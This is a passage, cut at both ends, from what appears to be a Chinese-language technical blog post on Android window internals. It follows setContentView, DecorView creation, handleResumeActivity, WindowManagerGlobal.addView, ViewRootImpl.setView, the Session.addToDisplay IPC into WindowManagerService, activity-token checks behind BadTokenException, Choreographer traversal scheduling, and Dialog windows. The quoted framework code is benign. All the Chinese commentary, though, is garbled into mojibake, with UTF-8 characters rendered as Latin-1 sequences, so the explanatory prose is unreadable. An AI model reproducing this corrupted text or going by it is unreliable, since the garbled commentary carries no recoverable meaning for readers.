= a.getResourceId( R.styleable.Window_windowActionBarFullscreenDecorLayout, R.layout.screen_action_bar); layoutResource = R.layout.screen_title; layoutResource = R.layout.screen_simple_overlay_action_mode; layoutResource = R.layout.screen_simple; //è¿™äº›å¯èƒ½çš„layoutResourceå°±æ˜¯DecorViewçš„childçš„å¸ƒå±€æ–‡ä»¶ mDecor.onResourcesLoaded(mLayoutInflater, layoutResource); //è¿™é‡Œé¢ç›´æ¥layoutInflaterè¿™ä¸ªå¸ƒå±€æ–‡ä»¶ï¼ŒdeocorViewå»addè¿™ä¸ªView ViewGroup contentParent = (ViewGroup)findViewById(ID_ANDROID_CONTENT);//åœ¨è¿™ä¸ªæ–°åˆ›å»ºçš„å¸ƒå±€ä¸­æ‰¾android.R.id.content } //installDecorèµ°å®Œè¿™ä¸ªmContentParentä¹Ÿå°±æ‰¾åˆ°äº† //ä¸Šé¢è¯´é“PhoneWindowçš„setContentViewå¤§è‡´ä¸¤å¥è¯ï¼ŒinstallDecor()å’ŒmLayoutInflater.inflate(layoutResID, mContentParent); //äºæ˜¯mLayoutInflater.inflate(layoutResID, mContentParent);å°±æ˜¯æŠŠå¼€å‘è€…å†™çš„layoutResæ–‡ä»¶å¯¹åº”çš„viewåˆ›å»ºå‡ºæ¥å¹¶ä¸”æ·»åŠ åˆ°mContentParentä¸­ åˆ°è¿™é‡Œæˆ‘ä»¬è‡ªå·±å†™çš„viewä¹Ÿå°±è¢«æ·»åŠ åˆ°android.R.id.contentè¿™ä¸ªFrameLayouté‡Œäº†ï¼Œè¿™æ—¶åº”è¯¥åœ¨onCreateé‡Œé¢ã€‚æ ¹æ®ActivityThreadåœ¨6.0çš„ä»£ç  //ActivityThread.java private void handleLaunchActivity(ActivityClientRecord r, Intent customIntent) { Activity a = performLaunchActivity(r, customIntent); if (a != null) { handleResumeActivity(r.token, false, r.isForward,!r.activity.mFinished &amp;&amp; !r.startsNotResumed); } } final void handleResumeActivity(IBinder token, boolean clearHide, boolean isForward, boolean reallyResume) { ActivityClientRecord r = performResumeActivity(token, clearHide);//è¿™é‡Œé¢å°±æ˜¯æ­£å¸¸çš„onResume if (r.window == null &amp;&amp; !a.mFinished &amp;&amp; willBeVisible) { r.window = r.activity.getWindow(); View decor = r.window.getDecorView();//æ‹¿åˆ°decorView decor.setVisibility(View.INVISIBLE);//æ”¹ä¸ºä¸å¯è§ ViewManager wm = a.getWindowManager(); WindowManager.LayoutParams l = r.window.getAttributes(); a.mDecor = decor; l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION; l.softInputMode |= forwardBit; if (a.mVisibleFromClient) { a.mWindowAdded = true; wm.addView(decor, l); //é€šè¿‡windowManagerå»addView,læ˜¯windowManagerçš„layoutparametersï¼ŒViewRootImplä¹Ÿå°±æ˜¯ä»è¿™é‡Œåˆ›å»º } } // The window is now visible if it has been added, we are not // simply finishing, and we are not starting another activity. //ä¸Šé¢è®¾ç½®INVISIBLEçš„åŸå› ï¼Œè¿™é‡Œä¹Ÿè¯´äº†ï¼Œå¦‚æœæ²¡æœ‰finishï¼Œä¹Ÿæ²¡æœ‰æ­£åœ¨èµ·å¦ä¸€ä¸ªactivityçš„è¯ï¼Œå°±å¯ä»¥è®©è¿™ä¸ªactivityå˜å¾—å¯è§äº† if (!r.activity.mFinished &amp;&amp; willBeVisible &amp;&amp; r.activity.mDecor != null &amp;&amp; !r.hideForNow) { if (r.activity.mVisibleFromClient) { r.activity.makeVisible(); } } } //activity.java void makeVisible() { if (!mWindowAdded) { ViewManager wm = getWindowManager(); wm.addView(mDecor, getWindow().getAttributes()); mWindowAdded = true; } mDecor.setVisibility(View.VISIBLE);//é‡æ–°æ”¹æˆvisible } åˆ°è¿™é‡Œï¼ˆonResumeèµ°å®Œï¼‰ï¼ŒDecorViewå°±è¢«WindowManagerè°ƒç”¨addViewäº†ã€‚ä¸‹é¢å¼€å§‹è®²è°ƒç”¨WindowManagerçš„addViewè¿™ä¸ªIPCéœ€è¦å‡†å¤‡çš„å‚æ•°å’Œè¿œç«¯å¦‚ä½•æ¥æ”¶è¿™ä¸ªæ”¶åˆ°çš„å‚æ•° WindowManagerGlobalWindowManageræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶addViewå’ŒremoveViewæ˜¯ç”±WindowManagerImplå»è°ƒç”¨WindowManagerGlobalåšçš„ï¼ˆè®¾è®¡æ¨¡å¼ï¼šä»£ç†æ¨¡å¼ã€‚WindowManagerGlobalæ˜¯appè¿›ç¨‹ä¸­çš„å•ä¾‹ï¼‰WindowManagerGlobalå’ŒWMSäº¤äº’è°ƒç”¨çš„æ˜¯IWindowManageråœ¨WMSä¸­çš„å¯¹åº”å®ç°WindowManagerGlobal.sWindowSessionæ˜¯appè¿›ç¨‹ä¸­æ‰€æœ‰viewRootImplçš„IWindowSession //WindowManagerGlobal.java public void addView(View view, ViewGroup.LayoutParams params, Display display, Window parentWindow) { final WindowManager.LayoutParams wparams = (WindowManager.LayoutParams) params; if (parentWindow != null) { parentWindow.adjustLayoutParamsForSubWindow(wparams);//è¿™é‡Œå°†activityçš„tokenè®¾ç½®åˆ°äº†WindowManager.layoutParamsä¸­ } ViewRootImpl root; root = new ViewRootImpl(view.getContext(), display); view.setLayoutParams(wparams); // do this last because it fires off messages to start doing things try { root.setView(view, wparams, panelParentView); } catch (RuntimeException e) { // BadTokenException or InvalidDisplayException, clean up. if (index &gt;= 0) { removeViewLocked(index, true); } throw e; } } åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬ä»activity.setContentView -&gt; åˆ›å»ºDecorViewå’ŒDecorViewçš„childï¼Œä»¥åŠæ‰¾åˆ°android.R.id.contentï¼Œå¾€é‡Œé¢æ·»åŠ è‡ªå®šä¹‰å¸ƒå±€ -&gt; handleResumeActivity(é€šè¿‡windowManager.addViewï¼Œç„¶åmakeVisible) ï¼Œè¿™äº›éƒ½æ˜¯ä¸€ä¸ªmessageä¸­å¤„ç†çš„ã€‚WindowManager.addViewè½¬å…¥ViewRootImplçš„setViewæ–¹æ³•,æŠŠdecorViewæ·»åŠ è¿›å»äº† ViewRootImpl//viewRootImpl.java //é¦–å…ˆéœ€è¦å£°æ˜ViewRootImplä¸æ˜¯View public final class ViewRootImpl implements ViewParent, View.AttachInfo.Callbacks, ThreadedRenderer.DrawCallbacks { } public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) { //è¿™é‡Œçš„viewæ˜¯DecorView int res; /* = WindowManagerImpl.ADD_OKAY; */ // Schedule the first layout -before- adding to the window // manager, to make sure we do the relayout before receiving // any other events from the system. requestLayout(); //å’ŒwindowManagerServiceæ‰“äº¤é“çš„ipcå°±åœ¨è¿™é‡Œäº† res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mWinFrame, mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mAttachInfo.mDisplayCutout, mInputChannel); // mWindowSessionæ˜¯WindowManagerGlobalæä¾›çš„ï¼Œå…¨å±€å”¯ä¸€çš„staticå˜é‡ // mWindowSessionæ˜¯IWindowSessionå¯¹è±¡ï¼ŒIWindowSession.aidlä¸­å®šä¹‰äº†è¿™ä¸ªipcçš„ä¸€ç³»åˆ—æ–¹æ³• //è¿™ä¸ªmWindowå…¶å®æ˜¯ViewRootImpl.W extends IWindow.Stubï¼Œä¹Ÿå°±æ˜¯WMSè¿œç¨‹è°ƒç”¨è¿›å…¥appè¿›ç¨‹ä¸­çš„ä»£ç† // Set up the input pipeline.è¿™äº›stageæ˜¯è´£ä»»é“¾æ¨¡å¼å¤„ç†äº‹ä»¶ï¼Œæ¯ä¸€ä¸ªæŒæœ‰å‰ä¸€ä¸ªçš„å¼•ç”¨ CharSequence counterSuffix = attrs.getTitle(); mSyntheticInputStage = new SyntheticInputStage(); InputStage viewPostImeStage = new ViewPostImeInputStage(mSyntheticInputStage); //è¿™ä¸ªæ˜¯å¤„ç†nativeå±‚ä¼ æ¥çš„inputEventçš„ InputStage nativePostImeStage = new NativePostImeInputStage(viewPostImeStage, &quot;aq:native-post-ime:&quot; + counterSuffix); InputStage earlyPostImeStage = new EarlyPostImeInputStage(nativePostImeStage); InputStage imeStage = new ImeInputStage(earlyPostImeStage, &quot;aq:ime:&quot; + counterSuffix); InputStage viewPreImeStage = new ViewPreImeInputStage(imeStage); InputStage nativePreImeStage = new NativePreImeInputStage(viewPreImeStage, &quot;aq:native-pre-ime:&quot; + counterSuffix); mFirstInputStage = nativePreImeStage; mFirstPostImeInputStage = earlyPostImeStage; mPendingInputEventQueueLengthCounterName = &quot;aq:pending:&quot; + counterSuffix; } ä¸‹é¢å¼€å§‹å…³æ³¨è¿™ä¸ªipc IWindowSession.addToDisplayåšäº†ä»€ä¹ˆå‚è€ƒã€Šæ·±å…¥ç†è§£Androidå· Iã€‹- ç¬¬å…«ç«  - Surface- è¯»ä¹¦ç¬”è®°-part2 ä¸‹é¢è¿™äº›éƒ½è¿è¡Œåœ¨system_serverè¿›ç¨‹frameworks/base/services/core/java/com/android/server/wm/Session.java final class Session extends IWindowSession.Stub{ @Override public int addToDisplay(IWindow window, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) { return mService.addWindow(this, window, seq, attrs, viewVisibility, displayId, outContentInsets, outStableInsets, outOutsets, outInputChannel); } } frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java WMSçš„æˆå‘˜å˜é‡åŒ…æ‹¬ mSessions:ArraySet&lt;Session&gt; //All currently active sessions with clients.ä¸€ä¸ªappåªæœ‰ä¸€ä¸ªsession mWindowMap:HashMap&lt;IBinder,WindowState&gt; // Mapping from an IWindow IBinder to the server&#39;s Window object.Keyæ˜¯IWindow mTokenMap:HashMap&lt;IBinder,WindowToken&gt; //Mapping from a token IBinder to a WindowToken object.keyåº”è¯¥æ˜¯IApplicationTokenï¼Œæ˜¯ä»WindowManager.LayoutParams.tokenè·¨ipcä¼ å…¥çš„ï¼Œvalueæ˜¯windowTokenã€‚ä¸€ä¸ªwindowToken(èƒŒåå¯¹åº”å”¯ä¸€activity)ï¼Œä¸‹é¢åŒ…å«å¤šä¸ªwindowState(ä¸€ä¸ªactivityå¯ä»¥æœ‰å¤šä¸ªçª—å£ï¼Œæ¯”å¦‚Dialog) ä¸€ä¸ªwindowTokenä¸­å­˜æœ‰å¤šä¸ªWindowState(token.windows),è€Œä¸€èˆ¬çš„ï¼Œä¸€ä¸ªWindowStateå°±å¯¹åº”ä¸€ä¸ªwindow.å°±åƒWMSè¦ç®¡ç†å¤šä¸ªapp(WindowToken)ï¼Œæ¯ä¸ªappæœ‰å¤šä¸ªçª—å£(WindowStateï¼Œåœ¨appç«¯å°±æ˜¯ViewRootImpl.W)ï¼Œ //windowManagerService.java public int addWindow(Session session, IWindow client, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) { if (token == null) { //è¿™å°±æ˜¯ç³»ç»Ÿè¦æ±‚TYPE_APPLICATIONç±»å‹çš„çª—å£ï¼Œè¦æ±‚å¿…é¡»æœ‰activityçš„token,å¦åˆ™ä¼šæŠ›å‡ºBadTokenExceptionå¼‚å¸¸ã€‚Dialogçš„typeæ˜¯TYPE_APPLICATION,æ‰€ä»¥å¿…é¡»è¦åœ¨layoutParamsä¸­å¡«ä¸Šactivityçš„token if (type &gt;= FIRST_APPLICATION_WINDOW &amp;&amp; type &lt;= LAST_APPLICATION_WINDOW) { //1-99ä¹‹é—´ ,TYPE_APPLICATION=2 Slog.w(TAG, &quot;Attempted to add application window with unknown token &quot; + attrs.token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_BAD_APP_TOKEN; } } // è¿™é‡ŒåŒ…æ‹¬ä¸€ç³»åˆ—çš„æ£€æŸ¥ // 1. çª—å£ç±»å‹å¿…é¡»æ˜¯åˆæ³•èŒƒå›´å†…çš„ï¼Œåº”ç”¨çª—å£ï¼Œå­çª—å£ï¼Œæˆ–è€…ç³»ç»Ÿçª—å£ // 2. å¦‚æœæ˜¯ç³»ç»Ÿçª—å£ï¼Œéœ€è¦è¿›è¡Œæƒé™æ£€æŸ¥ã€‚TYPE_TOAST,TYPE_WALLPAPERç­‰ä¸éœ€è¦æƒé™ // 3. å¦‚æœæ˜¯åº”ç”¨çª—å£ï¼Œå…ˆç”¨attrsé‡Œé¢çš„tokenæ£€ç´¢å‡ºæ¥WindowTokenï¼Œå¿…é¡»ä¸èƒ½ä¸ºnullï¼Œè€Œä¸”è¿˜å¾—æ˜¯Activityçš„mAppTokenï¼ŒåŒæ—¶è¯¥Activityè¿˜å¿…é¡»æ²¡æœ‰è¢«finishã€‚åœ¨Activityå¯åŠ¨çš„æ—¶å€™ï¼Œä¼šå…ˆé€šè¿‡WMSçš„addAppTokenæ–¹æ³•æ·»åŠ ä¸€ä¸ªAppWindowToken(IApplicationToken.Stub appToken)åˆ°mTokenMapä¸­ï¼ˆActivityStack.startActivityLockedï¼‰ï¼Œå…¶ä¸­keyå°±ç”¨åˆ°äº†IApplicationTokenã€‚è€Œè¿™ä¸ªmAppTokenå°±æ˜¯åœ¨activityçš„attachæ–¹æ³•é‡Œé¢èµ‹å€¼çš„ï¼Œå…·ä½“æ¥è‡ªAMS.(æ‰€ä»¥å°±æ˜¯system_serverè¿›ç¨‹åœ¨å¯åŠ¨ä¸€ä¸ªactivityçš„æ—¶å€™å¾€WMSçš„ä¸€ä¸ªmapé‡Œæ”¾äº†ä¸€ä¸ªnew WindowTokenå¯¹è±¡ã€‚appè¿›ç¨‹åœ¨handleLaunchActivityçš„æ—¶å€™ä¼šæ‹¿åˆ°è¿™ä¸ªappTokenï¼Œäºæ˜¯appè¿›ç¨‹æ‹¿ç€è¿™ä¸ªmAppTokené€šè¿‡ipcåˆ°WMSä¸­å»é—®ï¼Œæœ‰æ²¡æœ‰è¿™ä¸ªmAppTokenå­˜è¿‡ä¸œè¥¿) WindowState win = new WindowState(this, session, client, token, attachedWindow, appOp[0], seq, attrs, viewVisibility, displayContent); //åç»­ä¼šå°†è¿™ä¸ªWindowStateæ·»åŠ åˆ°WMSçš„æˆå‘˜ä¸­, token.windows.add(i, win); // ... // tokenMapé‡Œé¢æ²¡æœ‰æ‰¾åˆ° token = new WindowToken(this, attrs.token, -1, false); //attrså°±æ˜¯layoutParams.tokenå°±é€šè¿‡binder callä¼ å…¥wmsè¿›ç¨‹ï¼Œæ‰€ä»¥tokenå°±æ˜¯activityçš„tokenï¼Œtokenæ˜¯ç»‘å®šåœ¨windowä¸Šï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªactivityæœ‰ä¸€ä¸ª // .. if (addToken) { mTokenMap.put(attrs.token, token);//mTokenMapä¿å­˜æ‰€æœ‰çš„WindowTokenå¯¹è±¡,keyæ˜¯ } win.attach(); //å°†sessionæ·»åŠ åˆ°mSessionsä¸­ mWindowMap.put(client.asBinder(), win);//è¿™ä¸ªclientæ˜¯IWindowï¼Œå…¶å®å°±æ˜¯ViewRootImpl.Wç±»å¯¹è±¡ä¸ºkey,windowStateä½œä¸ºvalueã€‚è¿™ä¸å°±æ˜¯ä¸€ä¸ªViewRootImplå¯¹åº”ä¸€ä¸ªWindowStateå˜› } // WindowState.java void attach() { if (WindowManagerService.localLOGV) Slog.v( TAG, &quot;Attaching &quot; + this + &quot; token=&quot; + mToken + &quot;, list=&quot; + mToken.windows); mSession.windowAddedLocked(); } //Session.java void windowAddedLocked() { if (mSurfaceSession == null) { mSurfaceSession = new SurfaceSession(); mService.mSessions.add(this);// windowState.attach -&gt; Session.windowAddedLocked -&gt; WMS.msession.add(session) } mNumWindow++; } // windowToken.java //windowTokenä¼¼ä¹æœ‰ç”¨çš„æ–¹æ³•å°±è¿™ä¹ˆä¸€ä¸ªï¼Œä¹Ÿè¯´æ˜ä¸€ä¸ªwindowTokenå®é™…ä¸Šæœ‰å¤šä¸ªWindow void removeAllWindows() { for (int winNdx = windows.size() - 1; winNdx &gt;= 0; --winNdx) { WindowState win = windows.get(winNdx); if (WindowManagerService.DEBUG_WINDOW_MOVEMENT) Slog.w(WindowManagerService.TAG, &quot;removeAllWindows: removing win=&quot; + win); win.mService.removeWindowLocked(win); } windows.clear(); } ä¸€èˆ¬çš„ï¼Œæ¯ä¸€ä¸ªwindowéƒ½å¯¹åº”ä¸€ä¸ªWindowStateå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„æˆå‘˜ä¸­mClient(final IWindow mClient;)ç”¨äºè·Ÿåº”ç”¨ç«¯äº¤äº’æˆå‘˜å˜é‡mToken(WindowToken mToken;)ç”¨äºè·ŸAMSäº¤äº’ ViewRootImplä¸­æœ‰é’ˆå¯¹è¿œç¨‹è¿”å›çš„resåˆ¤æ–­çš„é€»è¾‘,ç»“åˆè¿™WindowManagerServiceçš„addViewæ–¹æ³•æŸ¥çœ‹æ›´åŠ æ¸…æ¥š //ViewRootImpl.java switch (res) { case WindowManagerGlobal.ADD_BAD_APP_TOKEN: case WindowManagerGlobal.ADD_BAD_SUBWINDOW_TOKEN: throw new WindowManager.BadTokenException( &quot;Unable to add window -- token &quot; + attrs.token + &quot; is not valid; is your activity running?&quot;); case WindowManagerGlobal.ADD_NOT_APP_TOKEN: throw new WindowManager.BadTokenException( &quot;Unable to add window -- token &quot; + attrs.token + &quot; is not for an application&quot;); case WindowManagerGlobal.ADD_APP_EXITING: throw new WindowManager.BadTokenException( &quot;Unable to add window -- app for token &quot; + attrs.token + &quot; is exiting&quot;); } //windowManagerService.java public int addWindow(Session session, IWindow client,xxx) { //ä»ä¸€ä¸ªHashMap&lt;IBinder,WindowToken&gt;ä¸­å»get(LayoutParams.attr.token) WindowToken token = displayContent.getWindowToken( hasParent ? parentWindow.mAttrs.token : attrs.token); //å¦‚æœå‘ç°æ²¡æœ‰windowToken(ä¸€ä¸ªWindowTokenæœ‰å¤šä¸ªwindowState,ä¹Ÿå°±æ˜¯æœ‰å¤šä¸ªwindow)ï¼Œå¼€å§‹æŠ¥é”™ if (token == null) { if (rootType &gt;= FIRST_APPLICATION_WINDOW &amp;&amp; rootType &lt;= LAST_APPLICATION_WINDOW) { // 1-99ä¹‹é—´ï¼Œå¤šæ•°æ˜¯è¿™é‡Œ Slog.w(TAG_WM, &quot;Attempted to add application window with unknown token &quot; + attrs.token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_BAD_APP_TOKEN; // è¿™é‡Œå›åˆ°appè¿›ç¨‹å°±æŠ›is your activity running? } }else { // ..çœç•¥.... if (atoken == null) { Slog.w(TAG_WM, &quot;Attempted to add window with non-application token &quot; + token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_NOT_APP_TOKEN; } else if (atoken.removed) { Slog.w(TAG_WM, &quot;Attempted to add window with exiting application token &quot; + token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_APP_EXITING; //è¿™é‡ŒæŠ›å‡ºä»€ä¹ˆé”™ï¼Œåœ¨ViewRootImplé‡Œé¢å°±æœ‰å¯¹åº”çš„è§£é‡Š } } æ·»åŠ Viewåˆ°WMSçš„æµç¨‹ ä»WMSä¸­RemoveViewçš„æµç¨‹ å›åˆ°ViewRootImplçš„setViewæ–¹æ³•,session.addToDisplay//ViewRootImpl.java res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mWinFrame, mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mAttachInfo.mDisplayCutout, mInputChannel); //appç«¯åˆ°æœåŠ¡ç«¯ //è°ƒç”¨æœåŠ¡ç«¯é€šè¿‡IWindowSession, // IWindowSessionåœ¨serverç«¯çš„å®ç°æ˜¯Session final IWindowSession mWindowSession; final class Session extends IWindowSession.Stub{ //è¿è¡Œåœ¨system_serverè¿›ç¨‹ï¼Œæ˜¯system_serverçš„binderæœåŠ¡ç«¯ } //æœåŠ¡ç«¯åˆ°appç«¯ //æ§åˆ¶appç«¯é€šè¿‡IWindowï¼Œappç«¯æä¾›çš„å®ç°å°±æ˜¯Wã€‚ final W mWindow; static class W extends IWindow.Stub{ //è¿è¡Œåœ¨appè¿›ç¨‹ï¼Œæ˜¯appç«¯çš„ViewRootImpl.WæœåŠ¡çš„binderä»£ç†å¯¹è±¡ //è¿™ä¸ªWçš„æ„é€ å‡½æ•°æŠŠViewRootImplç”¨weakReferenceåŒ…èµ·æ¥äº†ï¼Œè¿œç¨‹æœ‰æ¶ˆæ¯åˆ°è¾¾çš„æ—¶å€™å°±å»è°ƒç”¨viewRootImplçš„å¯¹åº”æ–¹æ³• } appç«¯é€šè¿‡IWindowSessionè°ƒç”¨WMSç«¯çš„æ–¹æ³•ï¼ŒWMSç«¯é€šè¿‡IWindow(WindowState.mClient)è°ƒç”¨appç«¯çš„æ–¹æ³• Windowè°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„IPCæœåŠ¡ BinderæœåŠ¡ç«¯ æ¥å£ æ‰€åœ¨è¿›ç¨‹ WindowManagerService IWindowManager system_server Session IWindowSession system_server ViewRootImpl.W IWindow appè¿›ç¨‹ ActivityRecord.Token IApplicationToken system_server ActivityRecord.Token:StartActivityé€šè¿‡binder callè¿›å…¥systemServerè¿›ç¨‹ï¼Œåœ¨AMSä¸­åˆ›å»ºç›¸åº”çš„ActivityRecord.Tokençš„æˆå‘˜å˜é‡appTokenï¼Œç„¶åå°†è¯¥å¯¹è±¡ä¼ é€’åˆ°ActivityThread. Tokenè¿™ä¸ªä¸œè¥¿åœ¨å‡ å¤„å‡ºç°äº†ï¼ŒActivityï¼ˆperformLaunchActivityä¸­çš„attachèµ‹å€¼ï¼Œå¯¹åº”AMSä¸­çš„ActivityRecordï¼‰Window(attachæ–¹æ³•é‡Œçš„PhoneWindow.setWindowManagerå»èµ‹å€¼)WindowManager.LayoutParams.token(ç”¨äºIPC)ViewRootImpl, View, View.AttachInfoï¼ˆéƒ½æ˜¯åœ¨dispatchAttachToWindowçš„æ—¶å€™å»è®¾ç½®åˆ°attachInfoçš„ï¼‰ã€‚æ‰€ä»¥ä»»æ„çš„Viewåªè¦è¢«æ·»åŠ äº†ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰attachInfoï¼Œä¹Ÿå°±æœ‰äº†token(attachInfoé‡Œçš„tokenéƒ½æ˜¯ViewRootImplç»™çš„ï¼Œä¹Ÿå°±æ˜¯ViewRootImpl.Wè¿™ä¸ªclassçš„å®ä¾‹) ViewRootImplçš„traversalä¸Šé¢æ‰è®²åˆ°handleResumeActivityä¹‹ååˆ›å»ºäº†ä¸€ä¸ªViewRootImplæ ¹æ®6.0çš„ä»£ç  //ActivityThread.java public void handleResumeActivity(IBinder token, boolean finalStateRequest, boolean isForward, String reason) { if (r.window == null &amp;&amp; !a.mFinished &amp;&amp; willBeVisible) { r.window = r.activity.getWindow();//è¿™äº›ä¸œè¥¿éƒ½æ˜¯åœ¨onCreateé‡Œé¢å»åˆ›å»ºå‡ºæ¥çš„ View decor = r.window.getDecorView(); decor.setVisibility(View.INVISIBLE); ViewManager wm = a.getWindowManager(); WindowManager.LayoutParams l = r.window.getAttributes(); a.mDecor = decor; l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION; l.softInputMode |= forwardBit; if (a.mVisibleFromClient) { a.mWindowAdded = true; wm.addView(decor, l);//è¿™é‡Œèµ°è¿›WindowManagerGlobal.addView } // If the window has already been added, but during resume // we started another activity, then don&#39;t yet make the // window visible. } else if (!willBeVisible) { if (localLOGV) Slog.v( TAG, &quot;Launch &quot; + r + &quot; mStartedActivity set&quot;); r.hideForNow = true; } } } å¥½åƒè¿˜æ²¡æœ‰scheduleTraversalå‘¢ã€‚æ¥ç€çœ‹ï¼Œåœ¨WindowManagerGlobalçš„addViewé‡Œé¢åˆ›å»ºäº†ViewRootImplï¼Œåè€…åœ¨setViewçš„æ—¶å€™: //WindowManagerGlobal.java root = new ViewRootImpl(view.getContext(), display); view.setLayoutParams(wparams);//è¿™é‡Œé¢ç›´æ¥ä¸€ä¸ªrequestLayout //ViewRootImpl.java // Schedule the first layout -before- adding to the window public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) { // Schedule the first layout -before- adding to the window // manager, to make sure we do the relayout before receiving // any other events from the system. requestLayout(); //è¿™é‡Œåˆè¿›è¡Œäº†ä¸€æ¬¡requestLayout //è¿™åé¢æ‰æ˜¯å»ipc res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mWinFrame, mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mAttachInfo.mDisplayCutout, mInputChannel); } //æ¥çœ‹çœ‹ViewRootImplçš„requestLayoutï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ViewParentæ¥å£çš„ @Override public void requestLayout() { if (!mHandlingLayoutInLayoutRequest) { checkThread(); mLayoutRequested = true; scheduleTraversals();//ç›´æ¥scheduleTraversaläº† } } scheduleTraversalsé‡Œé¢å°±æ˜¯ //ViewRootImpl.java void scheduleTraversals() { if (!mTraversalScheduled) { mTraversalScheduled = true; mTraversalBarrier = mHandler.getLooper().getQueue().postSyncBarrier();//PostSyncBarrierï¼Œè¿™ä¹‹ååªæœ‰å¼‚æ­¥æ¶ˆæ¯æ‰èƒ½é€šè¿‡ï¼ mChoreographer.postCallback( Choreographer.CALLBACK_TRAVERSAL, mTraversalRunnable, null); // mDisplayEventReceiver.scheduleVsync();è¯·æ±‚ç¡¬ä»¶ç³»ç»ŸVSyncä¿¡å· } } æ¥ä¸‹æ¥å°±æ˜¯mDisplayEventReceiver.onVsyncçš„æ—¶å€™å»doFrame //Choreographer.java try { Trace.traceBegin(Trace.TRACE_TAG_VIEW, &quot;Choreographer#doFrame&quot;); AnimationUtils.lockAnimationClock(frameTimeNanos / TimeUtils.NANOS_PER_MS); mFrameInfo.markInputHandlingStart(); doCallbacks(Choreographer.CALLBACK_INPUT, frameTimeNanos); //æœ€å…ˆå¤„ç†INPUT mFrameInfo.markAnimationsStart(); doCallbacks(Choreographer.CALLBACK_ANIMATION, frameTimeNanos);//éšåæ˜¯animation mFrameInfo.markPerformTraversalsStart(); doCallbacks(Choreographer.CALLBACK_TRAVERSAL, frameTimeNanos);//ç¬¬ä¸‰ä¸ªæ˜¯ViewRootImpl.doTraversalï¼Œåœ¨è¿™é‡ŒViewRootImplä¼šè§£é™¤postSyncBarrier doCallbacks(Choreographer.CALLBACK_COMMIT, frameTimeNanos); } finally { AnimationUtils.unlockAnimationClock(); Trace.traceEnd(Trace.TRACE_TAG_VIEW); } è¿™æ ·çœ‹æ¥ï¼Œåœ¨ç¬¬ä¸€æ¬¡handleResumeActivityçš„æ—¶å€™ï¼ŒChoreographerä¼šä¸»åŠ¨è®¾å®šä¸€æ¬¡traversalï¼Œåç»­çš„measure,layout,drawä¹Ÿå°±é¡ºç†æˆç« äº† Dialog(åˆ›å»ºäº†ä¸€ä¸ªwindow)å­çª—å£çš„è¯,å…¸å‹çš„ä¾‹å­æ˜¯dialogã€‚ç›´æ¥ä½¿ç”¨Activityçš„windowManagerå’ŒWMSäº¤äº’Dialogçš„æ„é€ å‡½æ•°ä¸­ //Dialog.java Dialog(@NonNull Context context, @StyleRes int themeResId, boolean createContextThemeWrapper) { mWindowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE); // æ­¤æ—¶æ‹¿åˆ°çš„æ˜¯Activityçš„windowManager final Window w = new PhoneWindow(mContext); mWindow = w; w.setCallback(this); w.setWindowManager(mWindowManager, null, null);//è¿™ä¸€æ®µæ˜¯ä¸ºè¿™ä¸ªnewå‡ºæ¥çš„PhoneWindowè®¾ç½®ä¸€ä¸ªwindownManagerã€‚ //ä¹Ÿå°±æ˜¯è¯´Dialogçš„æ˜¾ç¤ºå…¶å®æ˜¯ä½¿ç”¨äº†Activityçš„windowManagerå»è°ƒç”¨WMSçš„æœåŠ¡çš„ï¼Œè€ŒDialogè‡ªèº«çš„windowç”±äºæ²¡æœ‰tokenï¼Œæ‰€ä»¥è¿™ä¸ªwindowå¹¶ä¸èƒ½ç”¨äºå’ŒWMSäº¤äº’ã€‚æ›´å¤šçš„æ˜¯ç”¨äºæŒæœ‰DecorView(æ–°çš„windowçš„DecorView),ç­‰åˆ°iputäº‹ä»¶æ¥åˆ°æ—¶ï¼Œä¼šé€šè¿‡ViewRootImplä¼ é€’åˆ°DecorView(æ–°çš„windowçš„DecorView)ï¼ŒDecorViewå†äº¤ç»™WindowCallback. } //Activity.java void attach(){ mWindow.setWindowManager( (WindowManager)context.getSystemService(Context.WINDOW_SERVICE), mToken, mComponent.flattenToString(), (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0); } //Activity.java @Override public Object getSystemService(@ServiceName @NonNull String name) { if (WINDOW_SERVICE.equals(name)) { return mWindowManager; //..Activityç›´æ¥åœ¨è¿™é‡Œè®©Dialogè·å–åˆ°è‡ªå·±çš„windowManagerï¼ˆå…¶å¯¹åº”çš„windowå·²ç»å¡«å……å¥½mAppTokenäº†ï¼‰ } return super.getSystemService(name); } å¦‚æœæ²¡æœ‰tokençš„è¯ï¼ŒViewRootImpl.setViewæ–¹æ³•ä¼šåœ¨è¿œç¨‹å¤±è´¥ã€‚åœ¨Dialog.showä¸­è°ƒç”¨äº†mWindowManager.addView(mDecor, 